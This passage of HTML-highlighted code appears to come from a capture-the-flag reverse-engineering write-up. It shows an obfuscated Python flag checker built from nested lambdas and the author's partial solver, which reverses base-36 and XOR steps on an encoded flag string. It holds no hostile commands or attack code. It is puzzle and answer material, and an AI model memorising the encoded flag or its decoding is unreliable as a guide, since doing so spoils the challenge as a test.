style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _23\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _24\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_24\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_21\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _16)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _25\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _26\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_26\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_23\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_25\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _27\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _28\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_28\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _29\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _30\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_30\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _31\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _32\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">36\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> +\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 10\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _29.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">split\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _33\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _34\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_34\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_31\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_33\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _35\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _36\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_36\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _37\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _38\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: _37 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _38\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _39\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _40\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_40\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _41\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _42\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_42\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_39\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _43\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _44\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_44\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_27\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _45\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _46\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_46\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_43\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_45\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _47\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _48\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_48\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_35\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _49\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _50\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_50\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_47\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_49\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _51\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _52\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_52\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Correct FLAG!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _53\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _54\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_54\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Incorrect\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _55\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: (\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _56\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_56\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">_41\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">_53 \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _51 \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> _55\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _57\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">lambda\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\"> _58\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">: _58\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">))))))))))))))))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">something plus twelve\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">something -3 \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">something xor\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">stuff \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">this is what we have\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">stuff \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> stuff\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">split\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">stuff \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> [\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">36\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 10\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> c \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> stuff\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">stuff \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> [\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">ord\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ^\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 123\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> c \u003C/span>\u003Cspan 